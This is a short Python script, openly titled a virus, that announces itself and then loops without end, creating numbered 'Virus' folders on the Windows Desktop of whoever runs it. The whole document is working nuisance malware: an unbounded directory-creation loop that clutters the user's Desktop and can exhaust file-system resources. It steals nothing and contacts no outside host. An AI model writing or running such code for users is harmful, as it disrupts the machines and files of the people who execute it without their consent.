import os
import time

print("Assalim's Virus is Starting...")
time.sleep(1)

direct = os.getcwd().split('\\')

counter = 0

while True:
    counter += 1
    os.mkdir(f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop\\Virus{counter}')